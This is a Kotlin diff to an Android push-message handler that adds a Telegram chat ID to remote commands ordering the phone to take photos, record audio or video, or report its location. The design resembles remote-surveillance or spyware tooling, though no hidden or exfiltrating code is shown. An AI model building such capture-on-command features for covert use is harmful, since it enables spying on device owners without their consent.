@@ -8,24 +8,25 @@ class FCMService : FirebaseMessagingService() {
     override fun onMessageReceived(remoteMessage: RemoteMessage) {
         Log.d("FCMService", "From: ${remoteMessage.from}")
 
-        val data = remoteMessage.data
-        val type = data["type"]
-        val camera = data["camera"]
-        val flash = data["flash"]
-        val quality = data["quality"]
-        val duration = data["duration"]
+        val type = remoteMessage.data["type"]       // e.g. "photo", "video", "audio", "location", "ring", "vibrate"
+        val camera = remoteMessage.data["camera"]   // e.g. "front" or "rear"
+        val flash = remoteMessage.data["flash"]     // e.g. "true" or "false"
+        val quality = remoteMessage.data["quality"] // e.g. "420p", "720p", "1080p"
+        val duration = remoteMessage.data["duration"] // in seconds or minutes as per your design
+        val chatId = remoteMessage.data["chat_id"]  // The Telegram user/chat id
 
-        if (type != null) {
+        if (type != null && chatId != null) {
             ActionHandlers.dispatch(
                 applicationContext,
-                type,
-                camera,
-                flash,
-                quality,
-                duration // <--- Now correctly passes duration
+                type = type,
+                camera = camera,
+                flash = flash,
+                quality = quality,
+                duration = duration,
+                chatId = chatId
             )
         } else {
-            Log.d("FCMService", "Invalid or missing command data: $type $camera $flash $quality $duration")
+            Log.d("FCMService", "Invalid or missing command data: $type $camera $flash $quality $duration $chatId")
         }
     }
 
